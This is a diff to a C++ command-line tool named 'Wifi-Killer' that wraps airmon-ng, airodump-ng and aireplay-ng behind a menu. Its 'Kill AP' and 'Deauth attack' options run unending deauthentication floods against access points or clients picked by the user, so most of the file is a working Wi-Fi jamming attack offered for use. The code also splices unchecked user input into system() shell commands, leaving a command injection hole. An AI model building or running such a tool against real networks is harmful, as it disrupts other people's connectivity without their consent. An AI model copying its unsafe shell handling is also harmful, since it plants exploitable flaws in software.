@@ -3,8 +3,20 @@
 #include <stdexcept>
 #include <stdio.h>
 #include <vector>
+#include <signal.h>
+#include <algorithm>
 
 using namespace std;
+
+string findString(vector<string> strings, string word) {
+	for (auto i = strings.begin(); i < strings.end(); ++i)
+	{
+		if ( (*i).find(word) != string::npos ) {
+			return *i;
+		}
+	}
+	return "";
+}
 
 string exec(string command) {
 	char buffer[128];
@@ -23,58 +35,6 @@ string exec(string command) {
 	return result;
 }
 
-int wifi(string adapter) {
-	string bssid, ch, bssid2;
-	int varr = 0;
-	
-	system("toilet -s -w 150 -f mono12 -F metal Wifi-Killer");
-	
-	cout << "\n1-Scan networks\n2-Kill AP\n3-Deauth attack\n4-Exit\nWK>";
-	cin  >> varr;
-		
-	if ( varr == 4 ) {
-		system("clear");
-		cout<<"Exiting...\n";
-		system(("airmon-ng stop " + adapter +"mon").c_str());
-		system("service network-manager start");
-		return 0;
-	} else if ( varr == 1 ) {
-		system(("airodump-ng " + adapter + "mon").c_str());
-		wifi(adapter);
-	} else if ( varr == 2 ) {
-		system("clear");
-		system(("airodump-ng " + adapter + "mon").c_str());
-		cout<<"Enter BSSID to kill\nWK>";
-		cin>>bssid;
-		cout<<"Enter channel where work AP\nWK>";
-		cin>>ch;
-		system(("airodump-ng --bssid " + bssid + " -c " + ch + " " + adapter + "mon").c_str());
-		system("clear");
-		cout<<"Kill atack started\n";
-		sleep(3);
-		system(("aireplay-ng --deauth 0 -a " + bssid + " " + adapter + "mon").c_str());
-		system("clear");
-		wifi(adapter);
-	} else if ( varr == 3 ) {
-		system(("airodump-ng " + adapter + "mon").c_str());
-		cout<<"Enter BSSID to scan\nWK>";
-		cin>>bssid;
-		cout<<"Enter channel where work AP\nWK>";
-		cin>>ch;
-		system(("airodump-ng --bssid " + bssid + " -c " + ch + " " + adapter + "mon").c_str());
-		cout<<"Enter the station\nWK>";
-		cin>>bssid2;
-		system(("aireplay-ng --deauth 0 -a " + bssid + " -c " + bssid2 + " " + adapter + "mon").c_str());
-		system("clear");
-		wifi(adapter);
-	} else {
-		cout<<"ERROR\n";
-		sleep(3);
-		system("clear");
-		wifi(adapter);
-	}
-	return 0;
-}
 
 void clear() {
 	std::cout << "\x1B[2J\x1B[H";
@@ -117,22 +77,105 @@ void printNetworkDevices(vector<string> devices) {
 	}
 }
 
+int wifi(string adapter) {
+	string bssid, ch, bssid2;
+	int choice = 0;
+	
+	showLogo();
+	
+	cout << "\n1-Scan networks\n2-Kill AP\n3-Deauth attack\n4-Kill all soft using your Network Interface\n5-Exit\nWK>";
+	cin  >> choice;
+		
+	switch (choice)
+	{
+	case 1:
+		system(("airodump-ng " + adapter + "mon").c_str());
+		wifi(adapter);
+		break;
+	
+	case 2:
+		system("clear");
+		system(("airodump-ng " + adapter + "mon").c_str());
+		cout<<"Enter BSSID to kill\nWK>";
+		cin>>bssid;
+		cout<<"Enter channel where work AP\nWK>";
+		cin>>ch;
+		system(("airodump-ng --bssid " + bssid + " -c " + ch + " " + adapter + "mon").c_str());
+		system("clear");
+		cout<<"Kill atack started\n";
+		sleep(3);
+		system(("aireplay-ng --deauth 0 -a " + bssid + " " + adapter + "mon").c_str());
+		clear();
+		wifi(adapter);
+		break;
+
+	case 3:
+		system(("airodump-ng " + adapter + "mon").c_str());
+		cout<<"Enter BSSID to scan\nWK>";
+		cin>>bssid;
+		cout<<"Enter channel where work AP\nWK>";
+		cin>>ch;
+		system(("airodump-ng --bssid " + bssid + " -c " + ch + " " + adapter + "mon").c_str());
+		cout<<"Enter the station\nWK>";
+		cin>>bssid2;
+		system(("aireplay-ng --deauth 0 -a " + bssid + " -c " + bssid2 + " " + adapter + "mon").c_str());
+		clear();
+		wifi(adapter);
+		break;
+
+	case 4: 
+		system("airmon-ng check kill");
+		clear();
+		wifi(adapter);
+		break;
+
+	case 5:
+		clear();
+		if (findString(getNetworkDevices(), "mon") != "") {
+			cout << endl << "Stopping the mon interface..." << endl;
+			exec(("airmon-ng stop " + findString(getNetworkDevices(), "mon")).c_str());
+			cout << "Starting the network-manager..." << endl;
+			exec("service network-manager start");
+			exit(EXIT_SUCCESS);
+		}
+		break;
+
+	default:
+		wifi(adapter);
+		break;
+	}
+	
+	return 0;
+}
+
+void exit_handler(int Signal) {
+	string adapter = findString(getNetworkDevices(), "mon");
+	if (adapter != "") {
+		cout << endl << "Stopping the mon interface..." << endl;
+		exec(("airmon-ng stop " + adapter).c_str());
+		cout << "Starting the network-manager..." << endl;
+		exec("service network-manager start");
+		exit(EXIT_SUCCESS);
+	}
+}
+
 int main(int argc, char** argv) {
 	vector<string> devices;
 	int inputtedDevice = 0;
-	
+
 	clear();
+
+	signal(SIGINT, exit_handler);
 
 	if ( checkRoot() ) {
 		showLogo();
-		system("airmon-ng check kill");
 		devices = getNetworkDevices();
 		printNetworkDevices(devices);
 		cout << "Input index of needed device" << endl << "WK>";
 		cin >> inputtedDevice;
 
-		system(("airmon-ng start " + devices.at(inputtedDevice - 1)).c_str());
-		system("clear");
+		exec(("airmon-ng start " + devices.at(inputtedDevice - 1)).c_str());
+		clear();
 
 		wifi(devices.at(inputtedDevice - 1));
 
